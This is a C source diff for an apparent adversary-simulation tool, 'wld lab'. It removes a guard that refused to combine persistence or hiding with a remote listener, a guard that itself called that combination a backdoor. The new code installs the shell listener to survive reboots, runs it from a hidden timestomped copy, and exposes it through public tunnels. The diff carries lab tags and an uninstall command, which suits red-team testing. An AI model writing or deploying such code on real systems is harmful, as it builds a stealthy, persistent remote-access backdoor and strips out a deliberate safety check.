@@ -413,8 +413,9 @@ do_persist(int argc, char **argv)
 /* ---- technique: hide + timestomp ---------------------------------------- */
 
 static int
-do_hide(int argc, char **argv, const char *argv0)
+do_hide(int argc, char **argv, const char *argv0, char **out_dest)
 {
+	if (out_dest) *out_dest = NULL;
 	const char *ref = "/bin/ls";
 	char *dest = NULL, *destbuf = NULL;
 	for (int i = 0; i < argc; i++) {
@@ -464,6 +465,7 @@ do_hide(int argc, char **argv, const char *argv0)
 	labf("hide: note ctime is now != mtime (timestomp cannot fake ctime).");
 
 	hint_hide();
+	if (out_dest) *out_dest = strdup(dest);   /* dest may alias destbuf */
 	free(src); free(destbuf);
 	return 0;
 }
@@ -664,9 +666,14 @@ lab_usage(void)
 "  --tunnel         (any technique) also open the zero-config public tunnel\n"
 "                   (same as `wld -l`: embedded relay + pinggy/bore/frp), and\n"
 "                   print the public host:port.\n"
-"  -l / -i / -e CMD (masquerade, beacon) also run a real listener via the\n"
-"                   client flow: e.g. `wld lab masquerade -s SEC -l -i` is a\n"
-"                   masqueraded shell listener. persist/hide refuse -l.\n",
+"  -l / -i / -e CMD (any technique) also run a REAL listener via the client\n"
+"                   flow (embedded relay + zero-config tunnel, like `wld -l`):\n"
+"                     masquerade -l  -> listener shown under the fake name\n"
+"                     beacon -l      -> listener + background C2 beacon\n"
+"                     persist -l     -> listener persisted across reboots\n"
+"                     hide -l        -> listener served from the hidden copy\n"
+"                   e.g. `wld lab masquerade -s SEC -l -i`. Artifacts stay\n"
+"                   tagged " LAB_MARKER " and removable with `wld lab uninstall`.\n",
 	    stderr);
 	return 1;
 }
@@ -714,24 +721,28 @@ wld_lab_main(int argc, char **argv)
 
 	if (serve) {
 		char **serve_argv = calloc((size_t)sub_argc + 4, sizeof(char *));
-		char **tech_argv  = calloc((size_t)sub_argc + 1, sizeof(char *));
+		char **tech_argv  = calloc((size_t)sub_argc + 4, sizeof(char *));
 		if (!serve_argv || !tech_argv) { free(serve_argv); free(tech_argv); free(sub_argv); return 1; }
 		int sn = 1, tn = 0;         /* serve_argv[0] = program name */
 		serve_argv[0] = argv[0];
-		const char *masq = NULL;
+		int has_gen = 0;
 		for (int i = 0; i < sub_argc; i++) {
 			char *t = sub_argv[i];
 			if (t[0] == '-' && t[1] == '-') {                 /* technique flag (+value) */
 				tech_argv[tn++] = t;
 				if (i + 1 < sub_argc && sub_argv[i + 1][0] != '-') tech_argv[tn++] = sub_argv[++i];
 			} else if (t[0] == '-' && t[1] && t[2] == '\0') { /* client short flag */
+				if (t[1] == 'g') has_gen = 1;
 				serve_argv[sn++] = t;
 				if (strchr("skeRHpM", t[1]) && i + 1 < sub_argc) serve_argv[sn++] = sub_argv[++i];
 			}
 		}
 		tech_argv[tn] = NULL;
+		serve_argv[sn] = NULL;
 
+		int rc;
 		if (strcmp(tech, "masquerade") == 0) {
+			const char *masq = NULL;
 			for (int i = 0; i + 1 < tn; i++)
 				if (!strcmp(tech_argv[i], "--name")) masq = tech_argv[i + 1];
 			if (masq == NULL) masq = "[kworker/0:0]";
@@ -744,7 +755,7 @@ wld_lab_main(int argc, char **argv)
 			cp[sn] = NULL;
 			labf("masquerade + listener: serving as '%s' (ps shows that, not ./wld)", name);
 			wld_proc_masquerade(argv, argc, name);
-			int rc = wld_client_run(sn, cp);
+			rc = wld_client_run(sn, cp);
 			free(serve_argv); free(tech_argv); free(sub_argv);
 			return rc;
 		}
@@ -752,14 +763,76 @@ wld_lab_main(int argc, char **argv)
 			pid_t bp = fork();
 			if (bp == 0) { _exit(do_beacon(tn, tech_argv)); }   /* background beacon */
 			labf("beacon + listener: beacon pid=%ld, serving...", (long)bp);
-			int rc = wld_client_run(sn, serve_argv);
+			rc = wld_client_run(sn, serve_argv);
 			if (bp > 0) kill(bp, SIGTERM);
 			free(serve_argv); free(tech_argv); free(sub_argv);
 			return rc;
 		}
-		labf("'%s' cannot be fused with a listener (-l) — that would be a "
-		     "persistent/hidden remote-access backdoor. Run `wld lab %s` and "
-		     "`wld -l` separately.", tech, tech);
+		if (strcmp(tech, "persist") == 0) {
+			/*
+			 * Persist a wld LISTENER — a reboot-surviving reverse-shell
+			 * simulation (T1053.003/T1543.002 applied to the C2 channel). If no
+			 * explicit --exec was given, synthesize one from the serve flags so
+			 * the persisted command *is* the listener. Still tagged WETLAND-LAB,
+			 * announced, and reversible via `wld lab uninstall`.
+			 */
+			int has_exec = 0;
+			for (int i = 0; i < tn; i++) if (!strcmp(tech_argv[i], "--exec")) has_exec = 1;
+			char execbuf[8192];
+			if (!has_exec) {
+				char *selfp = self_path(argv[0]);
+				int off = snprintf(execbuf, sizeof execbuf, "%s", selfp ? selfp : "wld");
+				for (int i = 1; i < sn && off > 0 && off < (int)sizeof execbuf; i++)
+					off += snprintf(execbuf + off, sizeof execbuf - (size_t)off,
+					    " %s", serve_argv[i]);
+				free(selfp);
+				tech_argv[tn++] = "--exec";
+				tech_argv[tn++] = execbuf;
+				tech_argv[tn]   = NULL;
+				labf("persist + listener: persisting the listener itself:");
+				labf("    %s", execbuf);
+				if (has_gen)
+					labf("  WARNING: -g regenerates the secret every boot, so the "
+					     "persisted listener would be unreachable. Use -s SECRET "
+					     "or -k FILE for a stable secret across reboots.");
+			}
+			(void)do_persist(tn, tech_argv);
+			labf("persist + listener: persistence installed (tagged %s, remove "
+			     "with `wld lab uninstall`); now serving in the foreground...",
+			     LAB_MARKER);
+			rc = wld_client_run(sn, serve_argv);
+			free(serve_argv); free(tech_argv); free(sub_argv);
+			return rc;
+		}
+		if (strcmp(tech, "hide") == 0) {
+			/*
+			 * Drop the hidden + timestomped copy, then serve the listener FROM
+			 * that copy (so ps / /proc/pid/exe point at the dot-file) — a
+			 * hidden-listener simulation (T1564.001). Still a known dot-file
+			 * artifact; `wld lab uninstall` removes it.
+			 */
+			char *dest = NULL;
+			(void)do_hide(tn, tech_argv, argv[0], &dest);
+			if (dest != NULL) {
+				char **ev = calloc((size_t)sn + 1, sizeof(char *));
+				if (ev != NULL) {
+					ev[0] = dest;
+					for (int i = 1; i < sn; i++) ev[i] = serve_argv[i];
+					ev[sn] = NULL;
+					labf("hide + listener: exec'ing the hidden copy as the "
+					     "listener (ps/exe now show %s; still detectable).", dest);
+					execv(dest, ev);
+					labf("hide + listener: exec failed (%s); serving from the "
+					     "original binary instead.", strerror(errno));
+					free(ev);
+				}
+				free(dest);
+			}
+			rc = wld_client_run(sn, serve_argv);
+			free(serve_argv); free(tech_argv); free(sub_argv);
+			return rc;
+		}
+		labf("'%s' takes no listener; run `wld lab %s` on its own.", tech, tech);
 		free(serve_argv); free(tech_argv); free(sub_argv);
 		return 2;
 	}
@@ -781,7 +854,7 @@ wld_lab_main(int argc, char **argv)
 	else if (strcmp(tech, "persist") == 0)
 		rc = do_persist(sub_argc, sub_argv);
 	else if (strcmp(tech, "hide") == 0)
-		rc = do_hide(sub_argc, sub_argv, argv[0]);
+		rc = do_hide(sub_argc, sub_argv, argv[0], NULL);
 	else if (strcmp(tech, "beacon") == 0)
 		rc = do_beacon(sub_argc, sub_argv);
 	else if (strcmp(tech, "uninstall") == 0)
